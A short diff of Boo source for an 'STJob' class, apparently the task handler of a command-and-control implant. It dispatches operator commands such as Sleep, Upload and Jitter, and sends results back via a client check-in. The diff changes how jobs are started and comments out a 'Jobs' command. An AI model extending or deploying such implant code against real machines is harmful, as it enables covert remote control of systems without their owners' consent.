@@ -231,15 +231,15 @@ class STJob:
             print id, cmd
 
         if Job.args.run_in_thread:
-            _t as Thread = Thread() do:
-                Start()
-            t.Start()
+            Start.BeginInvoke(null, null)
         else:
             Start()
 
     /*
         if Job.args.run_in_thread:
-            Start.BeginInvoke(null, null)
+            _t as Thread = Thread() do:
+                Start()
+            t.Start()
         else:
             Start()
 
@@ -271,8 +271,8 @@ class STJob:
                 result = Sleep(Job.args.args[0])  # I hate this shit, but for now it'll do
             elif cmd == 'Upload':
                 result = Upload(Job.args.args[0])
-            elif cmd == 'Jobs':
-                result = Jobs(Job.args.args[0])
+            #elif cmd == 'Jobs':
+            #    result = Jobs(Job.args.args[0])
             elif cmd == 'Jitter':
                 if len(Job.args.args) == 2:
                     result = Jitter(Job.args.args[0], Job.args.args[1])
@@ -286,7 +286,8 @@ class STJob:
         EndTime = DateTime.Now
 
         Client.SendJobResults(self)
-    
+
+    /*
     public def Jobs(command as string, jobId as string):
         if command == 'list':
             for job in Client.Job:
@@ -300,6 +301,7 @@ class STJob:
             job = Client.Jobs.Find({j | return j.id == jobId})
             if job:
                 job.Start()
+    */
 
     public def CheckIn() as Hash:
          return JavaScriptSerializer().Deserialize[of Hash](JavaScriptSerializer().Serialize(Client))
